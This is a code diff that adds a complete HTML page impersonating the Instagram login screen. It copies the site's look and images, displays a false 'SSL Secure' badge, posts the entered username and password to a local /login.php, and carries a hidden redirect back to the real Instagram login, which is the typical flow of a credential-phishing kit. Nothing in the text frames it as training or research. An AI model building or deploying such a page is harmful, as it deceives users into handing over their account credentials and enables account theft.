@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 350px;
+            width: 100%;
+        }
+        
+        .card {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px 40px 20px;
+            margin-bottom: 10px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            font-family: 'Billabong', cursive;
+            font-size: 50px;
+            font-weight: 400;
+            color: #262626;
+            letter-spacing: -1px;
+        }
+        
+        .card form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .card input {
+            height: 38px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            padding: 0 8px;
+            margin-bottom: 6px;
+            transition: all 0.2s;
+        }
+        
+        .card input:focus {
+            outline: none;
+            border-color: #a8a8a8;
+            background: white;
+        }
+        
+        .card input::placeholder {
+            color: #8e8e8e;
+        }
+        
+        .card button {
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: white;
+            height: 32px;
+            cursor: pointer;
+            margin: 8px 0 12px;
+            transition: background 0.2s;
+        }
+        
+        .card button:hover {
+            background: #1877f2;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+            margin: 10px 0 18px;
+        }
+        
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .divider::before {
+            margin-right: 18px;
+        }
+        
+        .divider::after {
+            margin-left: 18px;
+        }
+        
+        .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 12px;
+            padding: 8px 0;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+        
+        .fb-login:hover {
+            background: #f0f2f5;
+        }
+        
+        .fb-login i {
+            font-size: 20px;
+            margin-right: 8px;
+        }
+        
+        .forgot {
+            text-align: center;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+            margin-top: 12px;
+            display: block;
+        }
+        
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        
+        .signup {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 20px 0;
+            text-align: center;
+            font-size: 14px;
+            border-radius: 1px;
+        }
+        
+        .signup a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        
+        .get-app {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .get-app p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            color: #262626;
+        }
+        
+        .app-links {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .app-links img {
+            height: 40px;
+            border-radius: 4px;
+            transition: opacity 0.2s;
+            cursor: pointer;
+        }
+        
+        .app-links img:hover {
+            opacity: 0.8;
+        }
+        
+        input[type="hidden"] {
+            display: none;
+        }
+        
+        /* Security note */
+        .security-note {
+            text-align: center;
+            font-size: 11px;
+            color: #8e8e8e;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <h1>Instagram</h1>
+            </div>
+            <form method="POST" action="/login.php" id="loginForm">
+                <input type="hidden" name="redirect" value="https://www.instagram.com/accounts/login">
+                <input type="text" name="username" placeholder="Phone number, username, or email" required autofocus>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="divider">OR</div>
+            <a href="#" class="fb-login" onclick="alert('Facebook login coming soon'); return false;">
+                <span>Log in with Facebook</span>
+            </a>
+            <a href="#" class="forgot" onclick="alert('Password reset link sent (demo)'); return false;">Forgot password?</a>
+        </div>
+        <div class="signup">
+            Don't have an account? <a href="#" onclick="alert('Signup page coming soon'); return false;">Sign up</a>
+        </div>
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play" onclick="alert('App store redirect (demo)'); return false;">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Microsoft" onclick="alert('App store redirect (demo)'); return false;">
+            </div>
+        </div>
+        <div class="security-note">
+            🔒 SSL Secure • Instagram © 2025
+        </div>
+    </div>
+
+    <script>
+        // Form validation
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const username = document.querySelector('input[name="username"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            
+            if (!username || !password) {
+                e.preventDefault();
+                alert('Please fill in all fields');
+            }
+        });
+        
+        // Simulate typing detection (optional)
+        const inputs = document.querySelectorAll('input');
+        inputs.forEach(input => {
+            input.addEventListener('input', function() {
+                this.style.borderColor = '#dbdbdb';
+            });
+        });
+    </script>
+</body>
+</html>
